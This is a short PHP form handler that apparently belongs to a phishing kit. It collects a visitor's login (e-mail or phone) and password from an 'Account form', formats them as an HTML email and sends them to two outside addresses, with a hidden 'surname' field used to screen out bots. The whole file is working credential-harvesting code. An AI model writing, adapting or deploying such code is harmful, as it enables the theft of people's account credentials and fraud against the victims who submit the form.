<?php
    $to = 'valerijudod2@gmail.com, schikk@ukr.net';

    $subject = 'Account';

  /*  $headers = "From: realestate.local\r\n";
    $headers .= "Reply-To: realestate.local\r\n";*/
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

    $message = '<html><body>';
    $message .= '<table rules="all" style="border-color: #eee; border-radius: 2px; margin: 10px;" cellpadding="10">';
    $message .= "<tr><td style='background: #fff; color: #fff; border-radius: 2px; padding: 15px 20px; font-size: 15px;' colspan='2'><strong>Account form</strong></td></tr>";
    $message .= "<tr style='background: #fefefe;'><td><strong>Login(e-mail, phone)</strong> </td><td>" . strip_tags($_POST['client-mail']) . "</td></tr>";
    $message .= "<tr style='background: #fefefe;'><td><strong>Pass</strong> </td><td>" . strip_tags($_POST['client-pass']) . "</td></tr>";  
    $message .= "</table>";
    $message .= '</body></html>';
				
if ( $_POST["surname"] == '' ){
            $sentMail = @mail($to, $subject, $message, $headers);
        }
?>